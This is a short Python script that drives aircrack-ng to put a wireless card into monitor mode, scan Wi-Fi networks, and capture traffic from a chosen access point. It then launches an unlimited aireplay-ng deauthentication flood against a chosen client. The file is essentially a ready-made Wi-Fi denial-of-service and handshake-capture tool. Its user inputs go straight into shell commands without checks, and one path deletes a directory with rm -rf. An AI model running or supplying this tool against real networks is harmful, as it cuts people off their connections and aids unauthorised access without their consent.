#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Author: clhore

# library
from termcolor import colored, cprint
from os import system, mkdir
from time import sleep

# Global variables
banner = colored('''

 ▓█████▄  ▒█████    ██████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓   
▒██▀ ██▌▒██▒  ██▒▒██    ▒ ▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒   
░██   █▌▒██░  ██▒░ ▓██▄   ▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░   
░▓█▄   ▌▒██   ██░  ▒   ██▒░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░    
░▒████▓ ░ ████▓▒░▒██████▒▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░    
 ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░      
 ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░   
 ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░   ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░         
   ░        ░ ░        ░   ░  ░  ░    ░ ░        ░              
 ░                                                              
        
    ''', 'red')

def modeMonitor(nic: str, mode=False):
    if mode:
        mon0 = f'airmon-ng start {nic} > /dev/null'
        system(mon0)
        cprint(f'[*] Inteface {nic} mode monitor', 'green')
        sleep(2)

    else:
        system('clear')
        mon0 = 'airmon-ng stop {0} >/dev/null'.format(nic)
        system(mon0)
        sleep(1)
        cprint('[*] Stop airmon-ng', 'green')
        mon0 = 'ip link set {0} up 2>/dev/null'.format(nic.replace('mon', ''))
        system(mon0)
        sleep(1)
        cprint(f'[*] Inteface {nic.replace('mon', '')} up', 'green')


def scanWIFIs(nic: str):
    cprint(f'[*] Start scan', 'green')
    sleep(1)
    airodump0 = f'airodump-ng {nic} 2>/dev/null'
    system(airodump0)

def scanWIFI(BSSID: str, channel: str, capDirectory: str, nic: str):
    airodump1 = f'airodump-ng --bssid {BSSID} --channel {channel} --write {capDirectory} {nic} 2>/dev/null'
    system(airodump1)

def DOS_HOST(BSSID: str, STATION: str, nic: str):
    aireplay = f'aireplay-ng -0 0 -a {BSSID} -c {STATION} {nic}'
    system(aireplay)

if __name__ == '__main__':

    print(banner)

    # Select your network card
    NetworkCard0 = input('Select networkCard: ')
    NetworkCard1 = f'{NetworkCard0}mon'

    # Network card mode monitor
    modeMonitor(NetworkCard0, True)

    # wifi scan
    scanWIFIs(NetworkCard1)
    
    # Target
    BSSID = input('BSSID: ')
    CH = input('CH: ')

    # Save capture
    opt = input('Default directory [y/n]: ')
    
    if opt == 'n':
        cap = input('Directory to save the capture: ')
    else:
        system('rm -rf scan/ 2>/dev/null')
        mkdir('scan')
        cap = 'scan/'

    # Start airodump-ng
    scanWIFI(BSSID, CH, cap, NetworkCard1)

    # Host target
    ST = input('STATION: ')

    # Deautenticate host
    DOS_HOST(BSSID, ST, NetworkCard1)
    sleep(1)
    
    # Network card stop mode monitor
    modeMonitor(NetworkCard1)
